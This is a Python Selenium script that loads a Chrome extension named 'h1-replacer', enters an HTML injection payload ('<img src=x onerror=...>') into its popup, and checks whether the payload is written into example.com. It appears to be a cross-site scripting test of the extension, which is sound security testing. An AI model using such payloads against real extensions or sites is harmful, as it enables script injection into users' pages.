import time
from selenium.webdriver import ActionChains, Chrome, ChromeOptions, Keys
from selenium.webdriver.common.by import By
from os import path
import hashlib

from pyvirtualdisplay.display import Display
from selenium.webdriver import Chrome, ChromeOptions
from selenium.webdriver.chrome.service import Service

abs_path = path.abspath("Extensions/h1-replacer/h1-replacer")

print(abs_path)
m = hashlib.sha256()
m.update(abs_path.encode("utf-8"))
ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
url_path = f"chrome-extension://{ext_id}/popup.html"
print(url_path)



with Display() as disp:
    print(disp.is_alive())
    options = ChromeOptions()
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    load_ext_arg = "load-extension="+abs_path
    options.add_argument(load_ext_arg)
    driver = Chrome(service=Service(), options=options)


    # get chrom extension popup.html path
    driver.get(url_path)


    # Use extension in context of www.example.com
    original = driver.current_window_handle
    driver.switch_to.new_window('tab')
    new = driver.current_window_handle
    driver.get('https://www.example.com')
    driver.get_screenshot_as_file("ss.png")



    # switch back to extension context
    driver.switch_to.window(original)
    entry_point = driver.find_element(By.ID,'replacementInput')
    payload = '<img src=x onerror="alert("1")">'

    entry_point.send_keys(payload)
    driver.get_screenshot_as_file("ss.png")

    button = driver.find_element(By.ID, 'replaceButton')

    time.sleep(1)

    driver.get_screenshot_as_file("ss.png")

    button.click()
    
    driver.switch_to.window(new)
    time.sleep(1)
    driver.get_screenshot_as_file("ss.png")

    print(driver.page_source)

